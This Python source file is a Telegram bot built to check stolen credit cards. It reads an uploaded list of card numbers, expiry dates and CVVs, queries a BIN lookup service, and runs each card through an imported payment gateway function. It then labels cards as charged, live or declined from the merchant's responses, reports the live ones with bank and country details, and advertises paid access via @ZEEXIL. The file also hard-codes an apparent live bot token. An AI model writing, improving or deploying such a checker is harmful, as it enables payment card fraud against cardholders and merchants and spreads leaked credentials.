import os
import requests
import telebot
import time
import threading
from telebot import types
from gatet import Tele
from datetime import datetime
from flask import Flask, request

# Initialize Flask app
app = Flask(__name__)

# Get token from environment variable
token = os.getenv('TELEGRAM_BOT_TOKEN', '7593327754:AAHoyYqLG3QYdDNvsa0EHFhD4NFgOU5vAeY')

if not token:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is required!")

bot = telebot.TeleBot(token, parse_mode="HTML")

def format_card(cc):
    """Clean and standardize card format to: NUMBER|MM|YY|CVV"""
    cc = cc.strip()
    # Replace any separators with pipe and remove spaces
    for sep in [' ', ':', ';', ',', '/']:
        cc = cc.replace(sep, '|')
    # Split and clean parts
    parts = [p.strip() for p in cc.split('|') if p.strip()]
    # Ensure we have exactly 4 parts (number, month, year, cvv)
    if len(parts) >= 4:
        # Format year to 2 digits if it's 4
        year = parts[2]
        if len(year) == 4:
            year = year[2:]
        return f"{parts[0]}|{parts[1]}|{year}|{parts[3]}"
    return cc  # Return original if format is invalid

@bot.message_handler(commands=["start"])
def start(message):
    if not str(message.chat.id) == '1944113838':
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @ZEEXIL")
        return
    bot.reply_to(message, "Send the file now")

@bot.message_handler(content_types=["document"])
def main(message):
    if not str(message.chat.id) == '1944113838':
        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @ZEEXIL")
        return
    
    stats = {
        'dd': 0,
        'ch': 0,
        'ccn': 0,
        'cvv': 0,
        'lowfund': 0
    }
    
    ko = (bot.reply_to(message, "GOOD LUCK CHECKING...").message_id)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    
    with open("combo.txt", "wb") as w:
        w.write(ee)
    
    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            processed = 0
            
            for cc in lino:
                processed += 1
                current_dir = os.getcwd()
                for filename in os.listdir(current_dir):
                    if filename.endswith(".stop"):
                        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, 
                                            text='STOP ✅\nBOT BY ➜ @ZEEXIL')
                        os.remove('stop.stop')
                        return
                
                # Format the card first
                formatted_cc = format_card(cc)
                try: 
                    data = requests.get('https://bins.antipublic.cc/bins/'+formatted_cc[:6]).json()
                except: 
                    data = {}
                
                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', '💡')
                bank = data.get('bank', 'Unknown')
                current_time = datetime.now().strftime("%I:%M %p")
                
                start_time = time.time()
                try:
                    last = str(Tele(formatted_cc))
                except Exception as e:
                    print(e)
                    last = 'API NOT RESPONSE'
                
                # Determine status and response
                if 'Thank' in last:
                    status = "✅ APPROVED"
                    response = "Transaction successful 🔥"
                    stats['ch'] += 1
                    show_details = True
                elif 'Your card does not support this type of purchase' in last:
                    status = "🔥 LIVE"
                    response = "CVV LIVE ✅"
                    stats['cvv'] += 1
                    show_details = True
                elif 'security code is incorrect' in last:
                    status = "🔥 LIVE"
                    response = "CCN LIVE ✅"
                    stats['ccn'] += 1
                    show_details = True
                elif 'insufficient funds' in last:
                    status = "🔥 LIVE"
                    response = "Insufficient funds 😢"
                    stats['lowfund'] += 1
                    show_details = True
                elif 'Verifying strong customer authentication' in last:
                    status = "🔥 LIVE"
                    response = "CVV LIVE ✅"
                    stats['cvv'] += 1
                    show_details = True
                else:
                    status = "❌ DECLINED"
                    response = "Card declined ❌"
                    stats['dd'] += 1
                    show_details = False
                
                # Progress message
                message_text = f"""
<b>🔍 ZEE CHECKING CARD</b>
────────────────────
<b>Card:</b> <code>{cc}</code>
<b>Status:</b> <code>{status}</code>
<b>Response:</b> <code>{response}</code>
<b>Time:</b> <code>{current_time}</code>
<b>Progress:</b> <code>{processed}/{total}</code>
────────────────────
"""
                # Statistics buttons
                markup = types.InlineKeyboardMarkup(row_width=2)
                btn1 = types.InlineKeyboardButton(f"CHARGED: {stats['ch']}🔥", callback_data='x')
                btn2 = types.InlineKeyboardButton(f"CVV: {stats['cvv']}✅", callback_data='x')
                btn3 = types.InlineKeyboardButton(f"CCN: {stats['ccn']}✅", callback_data='x')
                btn4 = types.InlineKeyboardButton(f"LOW FUNDS: {stats['lowfund']}😢", callback_data='x')
                btn5 = types.InlineKeyboardButton(f"DECLINED: {stats['dd']}❌", callback_data='x')
                btn6 = types.InlineKeyboardButton(f"TOTAL: {total}📊", callback_data='x')
                stop_btn = types.InlineKeyboardButton("🛑 STOP", callback_data='stop')
                markup.add(btn1, btn2, btn3, btn4, btn5, btn6, stop_btn)
                
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=ko,
                    text=message_text,
                    reply_markup=markup
                )
                
                # Detailed message for successful cards
                if show_details:
                    elapsed_time = round(time.time() - start_time, 1)
                    detailed_msg = f"""
<b>💳 ZEE CARD DETAILS</b>
────────────────────
<b>Card:</b> <code>{cc}</code>
<b>Status:</b> <code>{status}</code>
<b>Response:</b> <code>{response}</code>
────────────────────
<b>BIN:</b> <code>{formatted_cc[:6]}</code>-<code>{card_type.upper()}</code>
<b>Brand:</b> <code>{brand.upper()}</code>
<b>Bank:</b> <code>{bank.upper()}</code>
<b>Country:</b> <code>{country.upper()}</code> - <code>{country_flag}</code>
────────────────────
<b>Time:</b> <code>{elapsed_time}s ⏱️</code>
<b>Checked:</b> <code>{current_time}</code>
<b>Bot:</b> @ZEEXIL
"""
                    bot.send_message(message.chat.id, detailed_msg)
                
                time.sleep(1)
    
    except Exception as e:
        print(e)
    
    bot.edit_message_text(
        chat_id=message.chat.id, 
        message_id=ko, 
        text='✅ CHECK COMPLETED\nBot by @ZEEXIL'
    )

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    with open("stop.stop", "w") as file:
        pass

# Webhook route for Telegram
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        return 'Invalid content type', 403

# Health check route
@app.route('/')
def index():
    return '🤖 Bot is running!'

# Keep-alive function for UptimeRobot
def keep_alive():
    while True:
        try:
            requests.get("https://" + os.getenv('RENDER_EXTERNAL_URL', 'your-bot-name.onrender.com'))
        except:
            pass
        time.sleep(300)  # 5 minutes

if __name__ == '__main__':
    print("🤖 Starting Telegram Bot...")
    
    # Start keep-alive thread
    thread = threading.Thread(target=keep_alive)
    thread.daemon = True
    thread.start()
    
    # Set webhook
    try:
        bot.remove_webhook()
        time.sleep(1)
        webhook_url = "https://" + os.getenv('RENDER_EXTERNAL_URL', 'your-bot-name.onrender.com') + "/webhook"
        bot.set_webhook(url=webhook_url)
        print(f"✅ Webhook set successfully: {webhook_url}")
    except Exception as e:
        print(f"❌ Error setting webhook: {e}")
    
    # Run Flask app
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
